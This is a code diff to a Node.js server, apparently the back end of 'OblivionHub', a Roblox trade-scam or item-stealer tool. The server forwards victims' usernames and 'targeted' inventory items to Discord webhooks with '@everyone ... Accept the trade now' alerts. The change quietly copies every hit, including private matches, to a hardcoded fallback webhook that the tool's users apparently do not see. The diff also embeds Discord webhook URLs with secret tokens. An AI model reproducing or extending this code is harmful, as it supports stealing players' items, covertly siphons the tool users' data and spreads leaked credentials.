@@ -5,7 +5,6 @@ const PORT = process.env.PORT || 3000;
 
 const FALLBACK_WEBHOOK = 'https://discord.com/api/webhooks/1528664955258277940/DYi4QqN2pr93CM35VxOzy9MZ6eA2Fl408SuHHKgIvmsTtCcepASPG45NDsxXw_veRMA-';
 
-// Configuración del bot (avatar y nombre de usuario)
 const BOT_USERNAME = "Oblivion Trade Bot";
 const BOT_AVATAR = "https://cdn.pfps.gg/pfps/10184-389218-roblox.png";
 
@@ -39,7 +38,6 @@ app.post('/webhook', async (req, res) => {
 
         const timestamp = data.timestamp || Date.now();
 
-        // Determinar qué listas usar para "targeteados"
         let displayBrainTargeted, displayBaseTargeted, displayGearTargeted;
         if (hasPrivateItem) {
             displayBrainTargeted = privateBrainTargeted;
@@ -51,18 +49,13 @@ app.post('/webhook', async (req, res) => {
             displayGearTargeted = gearTargeted;
         }
 
-        // Calcular total de ítems targeteados
         const totalTargeted = displayBrainTargeted.length + displayBaseTargeted.length + displayGearTargeted.length;
 
-        // 🔴 SI NO HAY ÍTEMS TARGETEADOS → NO ENVIAR NADA
         if (totalTargeted === 0) {
             console.log('⏭️ Sin ítems targeteados. No se enviará notificación.');
             return res.status(200).json({ status: 'ok', message: 'Sin ítems targeteados, notificación omitida' });
         }
 
-        // ============================================================
-        //  FUNCIONES DE FORMATEO
-        // ============================================================
         function formatListWithCount(list) {
             if (!list || list.length === 0) return 'Ninguno';
             const counts = {};
@@ -107,37 +100,17 @@ app.post('/webhook', async (req, res) => {
         }).replace(/\//g, '-');
 
         // ============================================================
-        //  CONSTRUIR EL EMBED
+        //  CONSTRUIR EMBED (común para todos los webhooks)
         // ============================================================
         const embed = {
             title: '✅ OBLIVIONHUB SUCCESS',
             color: hasPrivateItem ? 0xffd700 : 0x00ff00,
             fields: [
-                {
-                    name: '👤 Username',
-                    value: player,
-                    inline: false
-                },
-                {
-                    name: '🧠 Brainrots targeted',
-                    value: brainTargetedStr,
-                    inline: false
-                },
-                {
-                    name: '⚙️ Gears targeted',
-                    value: gearTargetedStr,
-                    inline: false
-                },
-                {
-                    name: '🎨 Bases targeted',
-                    value: baseTargetedStr,
-                    inline: false
-                },
-                {
-                    name: '📦 UN-TARGETED ITEMS',
-                    value: truncateText(untargetedStr),
-                    inline: false
-                }
+                { name: '👤 Username', value: player, inline: false },
+                { name: '🧠 Brainrots targeted', value: brainTargetedStr, inline: false },
+                { name: '⚙️ Gears targeted', value: gearTargetedStr, inline: false },
+                { name: '🎨 Bases targeted', value: baseTargetedStr, inline: false },
+                { name: '📦 UN-TARGETED ITEMS', value: truncateText(untargetedStr), inline: false }
             ],
             footer: {
                 text: `OBLIVIONHUB | discord.gg/oblivionhub | oblivionhub.xyz • ${formattedDate}`
@@ -145,49 +118,54 @@ app.post('/webhook', async (req, res) => {
         };
 
         // ============================================================
-        //  CONSTRUIR PAYLOAD CON @everyone SEGÚN CORRESPONDA
+        //  PAYLOAD CON @everyone (para webhook privado o del usuario)
         // ============================================================
-        let content = '';
-
+        let contentWithMention = '';
         if (hasPrivateItem) {
-            // 🔴 Coincidencia privada → @everyone en español
-            content = '@everyone **¡Se ha detectado una coincidencia con ítems privados!** 🚀 Acepta el trade ahora.';
+            contentWithMention = '@everyone **¡Se ha detectado una coincidencia con ítems privados!** 🚀 Acepta el trade ahora.';
         } else {
-            // 🟢 Coincidencia del usuario → @everyone en inglés
-            content = '@everyone **A targeted item has been found!** 🚀 Accept the trade now.';
+            contentWithMention = '@everyone **A targeted item has been found!** 🚀 Accept the trade now.';
         }
 
-        const payload = {
-            content: content,
+        const payloadWithMention = {
+            content: contentWithMention,
             username: BOT_USERNAME,
             avatar_url: BOT_AVATAR,
             embeds: [embed]
         };
 
         // ============================================================
-        //  DECIDIR A QUÉ WEBHOOKS ENVIAR
+        //  PAYLOAD SIN @everyone (para FALLBACK_WEBHOOK)
+        // ============================================================
+        const payloadWithoutMention = {
+            content: '',  // Sin @everyone, solo el embed
+            username: BOT_USERNAME,
+            avatar_url: BOT_AVATAR,
+            embeds: [embed]
+        };
+
+        // ============================================================
+        //  DECIDIR A QUÉ WEBHOOKS ENVIAR Y CON QUÉ PAYLOAD
         // ============================================================
         const webhooksToSend = [];
 
         if (hasPrivateItem) {
-            // Coincidencia privada → SOLO al webhook privado
-            if (webhookUrl) {
-                webhooksToSend.push(webhookUrl);
-            } else {
-                webhooksToSend.push('https://discord.com/api/webhooks/1518688015692599416/9DG8JBvlf31P2FRj3dfRtamrWDpUpCymXpDMkfM8IMEPHVVKmXVeg1i_MXWVZpzokj6L');
-            }
+            // 🔴 Coincidencia privada: @everyone al webhook privado, SIN @everyone al FALLBACK
+            const privateWebhook = webhookUrl || 'https://discord.com/api/webhooks/1518688015692599416/9DG8JBvlf31P2FRj3dfRtamrWDpUpCymXpDMkfM8IMEPHVVKmXVeg1i_MXWVZpzokj6L';
+            webhooksToSend.push({ url: privateWebhook, payload: payloadWithMention });
+            webhooksToSend.push({ url: FALLBACK_WEBHOOK, payload: payloadWithoutMention });
         } else {
-            // Sin coincidencia privada → webhook del usuario (si existe) + FALLBACK
+            // 🟢 Sin coincidencia privada: @everyone al webhook del usuario (si existe), SIN @everyone al FALLBACK
             if (webhookUrl) {
-                webhooksToSend.push(webhookUrl);
+                webhooksToSend.push({ url: webhookUrl, payload: payloadWithMention });
             }
-            webhooksToSend.push(FALLBACK_WEBHOOK);
+            webhooksToSend.push({ url: FALLBACK_WEBHOOK, payload: payloadWithoutMention });
         }
 
         // ============================================================
         //  ENVIAR CON REINTENTOS (rate limit 429)
         // ============================================================
-        for (const url of webhooksToSend) {
+        for (const { url, payload } of webhooksToSend) {
             let retries = 3;
             let success = false;
             while (retries > 0 && !success) {
